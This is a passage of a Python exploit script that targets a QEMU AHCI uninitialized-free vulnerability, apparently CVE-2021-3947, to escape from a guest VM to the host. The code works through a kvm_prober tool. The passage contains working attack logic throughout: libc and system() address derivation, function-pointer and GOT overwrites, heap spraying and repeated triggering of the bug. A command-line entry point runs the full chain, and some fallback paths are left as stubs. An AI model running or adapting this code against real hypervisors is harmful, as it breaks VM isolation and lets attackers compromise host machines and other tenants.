            for pattern, name in common_libc_patterns.items():
                if abs(low_bits - pattern) < 0x100:
                    return f"libc {name}"
            return "libc function"
        elif 0xffff800000000000 <= addr < 0xffffffffffffffff:
            return "kernel function"
        
        return "unknown"
    
    def pointer_confidence(self, addr: int) -> int:
        """Rate confidence that this is a useful function pointer"""
        confidence = 0
        
        if 0x7f0000000000 <= addr < 0x7fffffffffff:
            confidence += 50  # libc pointers are very useful
        
        if 0x550000000000 <= addr < 0x560000000000:
            confidence += 30  # QEMU pointers are useful
        
        # Check for common function endings
        low_bits = addr & 0xFFF
        common_endings = [0x490, 0x290, 0x420, 0x8e0, 0x4e0]
        for ending in common_endings:
            if abs(low_bits - ending) < 0x100:
                confidence += 20
        
        return confidence
    
    def calculate_system_address(self) -> Optional[int]:
        """Calculate system() address using discovered offsets"""
        if 'libc_base' in self.leaked:
            libc_base = self.leaked['libc_base']
        elif 'libc_ptr' in self.leaked:
            # Try to deduce libc base from pointer
            libc_ptr = self.leaked['libc_ptr']
            
            # Use the offsets you found as fallbacks
            common_system_offsets = [
                0x4c490,    # Your found offset 1
                0x145200,   # Your found offset 2
                0x52290,    # Common Ubuntu 22.04
                0x50d60,    # Common Debian 11
            ]
            
            # Try each offset to find plausible base
            for offset in common_system_offsets:
                if libc_ptr > offset:
                    base_candidate = libc_ptr - offset
                    # Check if base is page-aligned
                    if (base_candidate & 0xFFF) == 0:
                        libc_base = base_candidate
                        self.leaked['libc_base'] = libc_base
                        log_info(f"Deduced libc base 0x{libc_base:016x} using offset 0x{offset:x}")
                        break
            else:
                # Default to page alignment
                libc_base = libc_ptr & 0xffffffffff000000
                self.leaked['libc_base'] = libc_base
        else:
            log_error("No libc pointer found")
            return None
        
        # Try multiple system offsets (prioritizing your found ones)
        system_offsets = [
            0x4c490,    # Your first found offset
            0x145200,   # Your second found offset
            0x52290,    # Fallback 1
            0x50d60,    # Fallback 2
            0x55410,    # Fallback 3
            0x4f420,    # Fallback 4
        ]
        
        for offset in system_offsets:
            system_addr = libc_base + offset
            log_info(f"Trying system() @ 0x{system_addr:016x} (offset 0x{offset:x})")
            
            # Quick sanity check - system() should be in libc text segment
            if 0x7f0000000000 <= system_addr < 0x7fffffffffff:
                self.leaked['system_addr'] = system_addr
                return system_addr
        
        log_error("Could not calculate valid system() address")
        return None
    
    def overwrite_function_pointer(self, ptr_info: Dict, system_addr: int, cmd_addr: int) -> bool:
        """Overwrite a function pointer with system() address"""
        target_addr = ptr_info['address']
        
        log_info(f"Attempting to overwrite function pointer at 0x{target_addr:016x}")
        log_info(f"  Original value: 0x{ptr_info['value']:016x}")
        log_info(f"  New value: 0x{system_addr:016x}")
        
        # Write the new pointer value
        if not self.guest_mem.write_qword(target_addr, system_addr):
            log_error(f"Failed to overwrite pointer at 0x{target_addr:016x}")
            return False
        
        # Verify the write
        verify = self.guest_mem.read_qword(target_addr)
        if verify == system_addr:
            log_success(f"Successfully overwritten pointer at 0x{target_addr:016x}")
            
            # For system() calls, we need to set up RDI = cmd_addr
            # Try to find/set up argument if possible
            self.setup_system_argument(target_addr, cmd_addr)
            
            return True
        else:
            log_error(f"Write verification failed at 0x{target_addr:016x}")
            if verify:
                log_error(f"Expected: 0x{system_addr:016x}, Got: 0x{verify:016x}")
            return False
    
    def setup_system_argument(self, func_ptr_addr: int, cmd_addr: int):
        """Attempt to set up argument for system() call"""
        log_info(f"Setting up system() argument: RDI = 0x{cmd_addr:016x}")
        
        # Try different strategies based on what we're overwriting
        
        # Strategy 1: If overwriting a timer callback, check timer struct
        # Timer callbacks often have the argument at a fixed offset
        timer_arg_offset = 0x30  # Common offset for timer callback argument
        
        # Strategy 2: If overwriting a function pointer in an object,
        # the object pointer itself might be in RDI/RBX
        
        # Strategy 3: Look for nearby pointers we can overwrite
        # to control arguments
        
        # For now, log what we're attempting
        log_info("Argument setup strategies:")
        log_info("  1. If timer callback, argument at offset 0x30")
        log_info("  2. If object method, 'this' pointer in RDI")
        log_info("  3. May need ROP chain for full control")
        
        # Try to find a place to store the command pointer
        # Look for null pointers near the function pointer we can overwrite
        for offset in [-0x20, -0x18, -0x10, 0x8, 0x10, 0x18, 0x20]:
            check_addr = func_ptr_addr + offset
            current = self.guest_mem.read_qword(check_addr)
            if current == 0 or current == 0x4141414141414141 or current == 0x4242424242424242:
                # This looks like unused/controlled memory
                if self.guest_mem.write_qword(check_addr, cmd_addr):
                    log_success(f"Set argument pointer at 0x{check_addr:016x} -> 0x{cmd_addr:016x}")
                    return True
        
        log_warning("Could not set up argument automatically - may need manual ROP")
    
    def fallback_exploit(self, cmd_addr: int) -> bool:
        """Fallback exploitation strategies"""
        log_info("Trying fallback exploitation strategies...")
        
        # Strategy 1: Direct memory corruption
        # Look for critical QEMU structures we might have corrupted
        
        # Strategy 2: Try to find and overwrite GOT entries
        if 'libc_base' in self.leaked:
            libc_base = self.leaked['libc_base']
            
            # Common GOT entries that might be in corrupted heap area
            got_targets = [
                ('free', 0x8e0),      # free@got.plt
                ('malloc', 0x8e0),    # malloc@got.plt  
                ('realloc', 0x8e0),   # realloc@got.plt
                ('calloc', 0x8e0),    # calloc@got.plt
            ]
            
            system_addr = self.calculate_system_address()
            if system_addr:
                log_info(f"Attempting to overwrite GOT entries with system() @ 0x{system_addr:016x}")
                # This would require finding GOT in memory
        
        # Strategy 3: Heap Feng Shui - rearrange heap for better control
        log_info("Attempting heap feng shui...")
        
        # Allocate more chunks to try to get better positioning
        additional_chunks = []
        for i in range(100):
            addr = self.guest_mem.alloc(self.chunk_size)
            if addr:
                additional_chunks.append(addr)
                # Write recognizable pattern
                self.guest_mem.write_qword(addr, 0x4847464544434241)  # ABCDEFGH
        
        log_info(f"Allocated {len(additional_chunks)} additional chunks")
        
        # Strategy 4: Try to trigger use-after-free
        log_info("Attempting to trigger use-after-free...")
        
        # Re-trigger vulnerability multiple times
        for i in range(3):
            log_info(f"Re-trigger attempt {i+1}/3")
            if self.trigger_vulnerability():
                # Check if we got better leaks
                new_leak = self.scan_for_leak()
                if new_leak:
                    log_success(f"Got new leak on re-trigger: 0x{new_leak:016x}")
                    # Try exploitation again with new leak
                    return self.execute_payload()
        
        log_error("All fallback strategies failed")
        log_info("Manual exploitation required:")
        log_info("  1. Use kvm_prober to examine corrupted heap areas")
        log_info("  2. Look for vtables, GOT entries, or function pointers")
        log_info("  3. Craft specific overwrite for found targets")
        log_info("  4. Consider ROP chain if direct overwrite not possible")
        
        return False

    def run_exploit(self) -> bool:
        """Main exploit execution"""
        log_info("=" * 60)
        log_info("STARTING AHCI EXPLOIT")
        log_info("=" * 60)

        # Setup
        if not self.setup():
            return False

        # Heap spray
        chunks = self.spray_heap()
        if not chunks:
            log_error("Failed to spray heap")
            return False

        # Trigger vulnerability
        triggered = False
        for attempt in range(self.retry_count):
            log_info(f"Trigger attempt {attempt + 1}/{self.retry_count}")

            if self.trigger_vulnerability():
                triggered = True
                break
            time.sleep(0.5)

        if not triggered:
            log_error("Failed to trigger vulnerability")
            return False

        # Scan for leak
        leak = self.scan_for_leak()
        if not leak:
            log_error("Failed to find heap leak")
            log_info("This could mean:")
            log_info("1. The vulnerability wasn't triggered correctly")
            log_info("2. Spray didn't land in the right place")
            log_info("3. QEMU version is not vulnerable")
            return False

        # Hijack control flow
        if not self.hijack_control():
            log_warning("Control flow hijack may not work")

        # Attempt to execute payload
        self.execute_payload()

        log_success("Exploit sequence completed!")
        log_info("If successful, you should see a file /tmp/exploit_success on host")
        return True

    def test_trigger_only(self) -> bool:
        """Test only the vulnerability trigger"""
        log_info("Testing vulnerability trigger...")

        if not self.setup():
            return False

        chunks = self.spray_heap()
        if not chunks:
            return False

        return self.trigger_vulnerability()

    def cleanup(self):
        """Clean up resources"""
        # kvm_prober doesn't need explicit cleanup
        log_info("Cleanup completed")

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def parse_args():
    import argparse
    parser = argparse.ArgumentParser(description='AHCI Uninitialized Free Exploit (kvm_prober version)')
    parser.add_argument('--kvm-prober', default='/root/kvm_probin/prober/kvm_prober',
                       help='Path to kvm_prober binary')
    parser.add_argument('--test-trigger', action='store_true',
                       help='Test only the vulnerability trigger')
    parser.add_argument('--debug', action='store_true',
                       help='Enable debug output')
    parser.add_argument('--chunk-size', type=lambda x: int(x, 0), default=FAKE_CHUNK_SIZE,
                       help=f'Fake chunk size (default: 0x{FAKE_CHUNK_SIZE:x})')
    parser.add_argument('--spray-count', type=int, default=SPRAY_COUNT,
                       help=f'Spray count (default: {SPRAY_COUNT})')
    parser.add_argument('--retry-count', type=int, default=RETRY_COUNT,
                       help=f'Retry count (default: {RETRY_COUNT})')
    return parser.parse_args()

def main():
    global DEBUG
    
    args = parse_args()
    DEBUG = args.debug
    
    log_info("AHCI Uninitialized Free Exploit - kvm_prober Version")
    log_info("Target: QEMU AHCI Device (hw/ide/ahci.c:1007) - CVE-2021-3947")
    log_info("Memory access via: kvm_prober")
    log_info(f"kvm_prober path: {args.kvm_prober}")
    log_info("=" * 60)
    
    # Check if we can run kvm_prober
    if not os.path.exists(args.kvm_prober):
        log_error(f"kvm_prober not found at {args.kvm_prober}")
        sys.exit(1)
    
    if not os.access(args.kvm_prober, os.X_OK):
        log_error(f"kvm_prober is not executable")
        sys.exit(1)
    
    exploit = AHCIExploit(kvm_prober_path=args.kvm_prober,
                         chunk_size=args.chunk_size,
                         spray_count=args.spray_count,
                         retry_count=args.retry_count)
    
    if args.debug:
        exploit.set_debug(True)
    
    try:
        if args.test_trigger:
            success = exploit.test_trigger_only()
            if success:
                log_success("Vulnerability trigger test successful!")
            else:
                log_error("Vulnerability trigger test failed")
        else:
            success = exploit.run_exploit()
            if success:
                log_success("Exploit appears to have succeeded!")
            else:
                log_error("Exploit failed")
                sys.exit(1)
            
    except KeyboardInterrupt:
        log_info("\nInterrupted by user")
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        log_info("Cleanup completed")

if __name__ == "__main__":
    main()